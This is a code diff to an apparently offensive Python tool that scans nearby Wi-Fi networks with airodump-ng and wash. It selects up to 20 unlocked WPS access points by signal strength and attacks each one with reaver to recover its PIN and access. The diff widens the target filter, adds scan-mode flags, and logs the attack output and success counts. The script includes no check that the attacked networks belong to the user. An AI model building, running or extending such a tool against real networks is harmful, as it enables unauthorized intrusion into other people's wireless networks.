-    # Run airodump scan
-    csv_file = run_airodump(args.interface, args.airodump_duration, args.output_prefix, tui)
-    aps = parse_airodump_csv(csv_file)
+    # Initialize unified results manager for WPS 1.0/2.0/Locked networks
+    results_manager = WPSResultsManager()
 
-    # Run wash if not skipped
-    if not args.skip_wash:
-        # Use wash-duration if specified, otherwise use same duration as airodump
+    # Run scans based on CLI flags (default: run both)
+    if not args.only_wash:
+        # Run airodump-ng scan (parses live output)
+        run_airodump_live(args.interface, args.airodump_duration, results_manager, tui)
+
+    if not args.only_airodump:
+        # Run wash scan
         wash_duration = args.wash_duration if args.wash_duration is not None else args.airodump_duration
-        wps_info = run_wash(args.interface, wash_duration, tui)
+        run_wash(args.interface, wash_duration, results_manager, tui)
 
-        # Merge WPS + Locked info (wash overrides airodump for more reliable lock detection)
-        for bssid, ap in aps.items():
-            if bssid in wps_info:
-                # wash provides more reliable WPS lock detection than airodump
-                ap.wps = wps_info[bssid]["wps"]
-                ap.locked = wps_info[bssid]["locked"]
-            # If airodump detected WPS but wash didn't find it, keep airodump's values
-    else:
-        tui_print("[*] Skipping wash scan, using airodump WPS data only", tui)
+    # Get union of all WPS results (sorted by signal strength)
+    wps_results = results_manager.get_all_results()
+
+    # Write scan results to files (CSV and table format)
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    scan_filename = f"wps_scan_{timestamp}"
+    csv_file = write_wps_results_csv(wps_results, scan_filename)
+    table_file = write_wps_results_table(wps_results, scan_filename)
+    tui_print(f"[+] WPS scan results saved to: {csv_file} and {table_file}", tui)
 
     # Switch from scan phase to attack phase (changes table display)
     if tui and tui.enabled:
         tui.scan_phase = False
 
-    # Sort strongest first (PWR closer to 0)
-    sorted_aps = sorted(aps.values(), key=lambda x: x.pwr, reverse=True)
+    # Convert WPSAccessPoint to AccessPoint for attack phase and display
+    sorted_aps = [wps_to_access_point(wps_ap) for wps_ap in wps_results]
 
     # Display passive scan results (only in non-TUI mode or before TUI starts)
     if not tui or not tui.enabled:
@@ -1191,16 +1413,16 @@ def run_main_logic(args, tui=None):
     # Filter for WPS-enabled targets that are not locked
     wps_targets = [
         ap for ap in sorted_aps
-        if ap.wps != "?" and ap.locked != "Yes"
+        if ap.locked != "Yes"
     ]
 
     if not wps_targets:
-        tui_print("[!] No WPS-enabled targets found", tui)
+        tui_print("[!] No unlocked WPS targets found", tui)
         return
 
     # Take top 20
     targets = wps_targets[:20]
-    tui_print(f"\n[+] Found {len(wps_targets)} WPS-enabled targets", tui)
+    tui_print(f"\n[+] Found {len(wps_targets)} unlocked WPS targets", tui)
     tui_print(f"[+] Attacking top {len(targets)} targets\n", tui)
 
     # Initialize progress stats
@@ -1233,6 +1455,17 @@ def run_main_logic(args, tui=None):
     update_targets_table(results, stats, tui)
     time.sleep(2)  # Give user time to see the initial state
 
+    # Create reaver output log file
+    reaver_log_filename = f"reaver_output_{timestamp}.log"
+    reaver_log = open(reaver_log_filename, 'w')
+    reaver_log.write(f"Reaver Complete Output Log\n")
+    reaver_log.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+    reaver_log.write(f"Interface: {args.interface}\n")
+    reaver_log.write(f"Total Targets: {len(targets)}\n")
+    reaver_log.write(f"{'='*80}\n\n")
+    reaver_log.flush()
+    tui_print(f"[+] Reaver output logging to: {reaver_log_filename}", tui)
+
     # Attack each target
     for idx, target in enumerate(targets, 1):
         stats['current_target'] = target
@@ -1251,7 +1484,8 @@ def run_main_logic(args, tui=None):
             results,
             max_retries=10,
             verbose=args.verbose,
-            tui=tui
+            tui=tui,
+            log_file=reaver_log
         )
 
         # Update stats
@@ -1266,6 +1500,13 @@ def run_main_logic(args, tui=None):
         # Final table update for this target
         update_targets_table(results, stats, tui)
 
+    # Close reaver log file
+    reaver_log.write(f"\n{'='*80}\n")
+    reaver_log.write(f"All attacks completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+    reaver_log.write(f"Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}\n")
+    reaver_log.close()
+    print(f"[+] Complete reaver output saved to: {reaver_log_filename}")
+
     # Exit curses mode before showing final results
     if tui and tui.enabled:
         # Disable TUI to allow normal printing
@@ -1274,8 +1515,7 @@ def run_main_logic(args, tui=None):
     # Display final results
     print_results_table(results)
 
-    # Save results to file
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    # Save attack results to file
     log_filename = f"wifi_audit_results_{timestamp}.txt"
     save_results_to_file(results, args.interface, log_filename)
 
@@ -1329,11 +1569,20 @@ def main():
         help="disable curses TUI, use legacy scrolling output (for debugging or compatibility)"
     )
     parser.add_argument(
-        "--skip-wash",
+        "--only-airodump",
         action="store_true",
-        help="skip wash scan, use only airodump WPS detection (faster but less reliable lock detection)"
+        help="use only airodump-ng scan, skip wash"
+    )
+    parser.add_argument(
+        "--only-wash",
+        action="store_true",
+        help="use only wash scan, skip airodump-ng"
     )
     args = parser.parse_args()
+
+    # Validate mutually exclusive options
+    if args.only_airodump and args.only_wash:
+        parser.error("--only-airodump and --only-wash are mutually exclusive")
 
     # Decide whether to use curses or not
     use_curses = not args.no_curses and not args.passive
